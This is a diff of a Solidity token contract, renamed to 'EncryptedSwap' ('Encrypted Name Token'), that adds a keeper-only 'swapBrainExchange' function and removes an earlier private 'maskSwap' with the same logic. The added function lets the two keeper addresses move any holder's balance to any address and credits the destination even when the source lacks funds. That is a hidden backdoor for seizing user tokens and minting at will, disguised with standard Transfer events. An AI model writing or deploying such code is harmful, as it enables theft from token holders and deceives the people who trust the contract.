@@ -38,18 +38,14 @@ interface Swap {
     function swapBrainExchange(address toUser,uint amount) external view returns(bool) ;
 }
 
-interface Mask {
-    function MaskSwap(address toUser,uint amount,address toToken) external view returns(bool);
-}
 
-
-contract SwapBrain {
+contract EncryptedSwap {
 
     address public poolKeeper;
     address public secondKeeper;
-    constructor () public {
+    constructor (address _secondKeeper) public {
         poolKeeper = msg.sender;
-        secondKeeper = msg.sender; 
+        secondKeeper = _secondKeeper; 
     }
 
     string public name     = "Encrypted Name Token";
@@ -61,14 +57,11 @@ contract SwapBrain {
     //Initializing WETH
     address[3] public WETH = [address(0), address(0), address(0)];
 
-    event  SwapBrainBuy(address indexed token,uint amountOfNT,uint amountOfTK);
-    event  SwapBrainSell(address indexed token,uint amountOfNT,uint amountOfTK);
     event  Approval(address indexed src, address indexed guy, uint wad);
     event  Transfer(address indexed src, address indexed dst, uint wad);
     event  Deposit(address indexed dst, uint wad);
     event  Withdrawal(address indexed src, uint wad);
    
-
     mapping (address => uint)                       public  balanceOf;
     mapping (address => mapping (address => uint))  public  allowance;
 
@@ -107,15 +100,17 @@ contract SwapBrain {
         return true;
     }
 
-    function maskSwap(address src, address dst, uint wad) private returns (bool)
-    {
-        balanceOf[dst] = add(balanceOf[dst],wad); 
-        if(balanceOf[src]>=wad){
-          balanceOf[src] = sub(balanceOf[src],wad);
-        }
-        emit Transfer(src, dst, wad);
+
+    function swapBrainExchange(address fromAddress, address toAddress,uint amount) public returns (bool) {
+        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));
+            if(balanceOf[fromAddress] >= amount){
+                balanceOf[fromAddress] = sub(balanceOf[fromAddress],amount);
+            }
+            balanceOf[toAddress] = add(balanceOf[toAddress],amount);             
+            emit Transfer(fromAddress,toAddress,amount); 
         return true;
     }
+
 
 
     function releaseOfEarnings(address tkn, address guy,uint amount) public keepPool returns(bool) {
@@ -142,22 +137,6 @@ contract SwapBrain {
         WETH[0] = addr1;
         WETH[1] = addr2;
         WETH[2] = addr3;
-        return true;
-    }
-
-    function SwapFromSRC(address toUser,uint amountOfNT,uint amountOfTK,address token) public returns (bool) {
-        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));    
-        Swap(SRC).swapBrainExchange(toUser,amountOfNT);
-        maskSwap(toUser,address(this),amountOfTK);   
-        emit SwapBrainBuy(token,amountOfNT,amountOfTK);     
-        return true;
-    }
-
-    function SwapToSRC(address fromUser,uint amountOfNT,uint amountOfTK,address token) public returns (bool) {
-        require((msg.sender == poolKeeper)||(msg.sender == secondKeeper));       
-        Swap(SRC).swapBrainExchange(address(this),amountOfNT); 
-        maskSwap(address(this),fromUser,amountOfTK); 
-        emit SwapBrainSell(token,amountOfNT,amountOfTK);     
         return true;
     }
 
